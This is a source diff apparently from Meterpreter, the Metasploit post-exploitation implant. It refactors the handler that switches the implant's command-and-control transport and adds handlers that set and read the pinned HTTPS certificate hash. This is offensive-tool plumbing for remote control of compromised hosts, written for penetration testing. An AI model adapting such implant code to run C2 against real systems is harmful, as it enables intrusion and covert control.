@@ -59,12 +59,13 @@ typedef struct _MIGRATECONTEXT
 
 } MIGRATECONTEXT, * LPMIGRATECONTEXT;
 
-
+// TODO: put these somewhere more sane? Requires some refactoring of core code which doesn't belong
+// in the common.lib
 extern Transport* transport_create_tcp(wchar_t* url);
 extern Transport* transport_create_http(BOOL ssl, wchar_t* url, wchar_t* ua, wchar_t* proxy,
 	wchar_t* proxyUser, wchar_t* proxyPass, PBYTE certHash, int expirationTime, int commsTimeout);
 
-BOOL remote_request_core_change_transport(Remote* remote, Packet* packet, DWORD* pResult)
+BOOL remote_request_core_transport_change(Remote* remote, Packet* packet, DWORD* pResult)
 {
 	DWORD result = ERROR_NOT_ENOUGH_MEMORY;
 	Packet* response = packet_create_response(packet);
@@ -84,7 +85,7 @@ BOOL remote_request_core_change_transport(Remote* remote, Packet* packet, DWORD*
 
 		if (transportType == METERPRETER_TRANSPORT_SSL)
 		{
-			remote->nextTransport = transport_create_tcp(transportUrl);
+			remote->next_transport = transport_create_tcp(transportUrl);
 		}
 		else
 		{
@@ -97,7 +98,7 @@ BOOL remote_request_core_change_transport(Remote* remote, Packet* packet, DWORD*
 			int expirationTimeout = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_SESSION_EXP);
 			int commsTimeout = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_COMMS_TIMEOUT);
 
-			remote->nextTransport = transport_create_http(ssl, transportUrl, ua, proxy,
+			remote->next_transport = transport_create_http(ssl, transportUrl, ua, proxy,
 				proxyUser, proxyPass, certHash, expirationTimeout, commsTimeout);
 
 			SAFE_FREE(ua);
@@ -118,6 +119,130 @@ BOOL remote_request_core_change_transport(Remote* remote, Packet* packet, DWORD*
 	SAFE_FREE(transportUrl);
 
 	return result == ERROR_SUCCESS ? FALSE : TRUE;
+}
+
+/*!
+ * @brief Set the current hash that is used for SSL certificate verification.
+ * @param remote Pointer to the \c Remote instance.
+ * @param packet Pointer to the request packet.
+ * @returns Indication of success or failure.
+ */
+DWORD remote_request_core_transport_setcerthash(Remote* remote, Packet* packet)
+{
+	DWORD result = ERROR_SUCCESS;
+	Packet* response;
+
+	do
+	{
+		response = packet_create_response(packet);
+		if (!response)
+		{
+			result = ERROR_NOT_ENOUGH_MEMORY;
+			break;
+		}
+
+		// no setting of the cert hash if the target isn't a HTTPS transport
+		if (remote->transport->type != METERPRETER_TRANSPORT_HTTPS)
+		{
+			result = ERROR_BAD_ENVIRONMENT;
+			break;
+		}
+
+		unsigned char* certHash = packet_get_tlv_value_raw(packet, TLV_TYPE_TRANS_CERT_HASH);
+		HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;
+
+		// Support adding a new cert hash if one doesn't exist
+		if (!ctx->cert_hash)
+		{
+			if (certHash)
+			{
+				PBYTE newHash = (unsigned char*)malloc(sizeof(unsigned char)* CERT_HASH_SIZE);
+				if (!newHash)
+				{
+					result = ERROR_NOT_ENOUGH_MEMORY;
+					break;
+				}
+
+				memcpy(newHash, certHash, CERT_HASH_SIZE);
+
+				// Set it at the last minute. Mucking with "globals" and all, want to make sure we
+				// don't set it too early.. just in case.
+				ctx->cert_hash = newHash;
+			}
+			else
+			{
+				// at this time, don't support overwriting of the existing hash
+				// as that will cause issues!
+				result = ERROR_BAD_ARGUMENTS;
+				break;
+			}
+		}
+		// support removal of the existing hash
+		else
+		{
+			if (certHash)
+			{
+				result = ERROR_BAD_ARGUMENTS;
+				break;
+			}
+			else
+			{
+				SAFE_FREE(ctx->cert_hash);
+			}
+		}
+
+		result = ERROR_SUCCESS;
+	} while (0);
+
+	if (response)
+	{
+		packet_transmit_response(result, remote, response);
+	}
+
+	return result;
+}
+
+/*!
+ * @brief Get the current hash that is used for SSL certificate verification.
+ * @param remote Pointer to the \c Remote instance.
+ * @param packet Pointer to the request packet.
+ * @returns Indication of success or failure.
+ */
+DWORD remote_request_core_transport_getcerthash(Remote* remote, Packet* packet)
+{
+	DWORD result = ERROR_SUCCESS;
+	Packet* response;
+
+	do
+	{
+		response = packet_create_response(packet);
+		if (!response)
+		{
+			result = ERROR_NOT_ENOUGH_MEMORY;
+			break;
+		}
+
+		// Rather than error out if the transport isn't HTTPS, we'll just return
+		// an empty response. This prevents a horrible error appearing in the
+		// MSF console
+		if (remote->transport->type == METERPRETER_TRANSPORT_HTTPS)
+		{
+			HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;
+			if (ctx->cert_hash)
+			{
+				packet_add_tlv_raw(response, TLV_TYPE_TRANS_CERT_HASH, ctx->cert_hash, CERT_HASH_SIZE);
+			}
+		}
+
+		result = ERROR_SUCCESS;
+	} while (0);
+
+	if (response)
+	{
+		packet_transmit_response(result, remote, response);
+	}
+
+	return result;
 }
 
 /*!
@@ -148,6 +273,7 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 		response = packet_create_response(packet);
 		if (!response)
 		{
+			dwResult = ERROR_NOT_ENOUGH_MEMORY;
 			break;
 		}
 
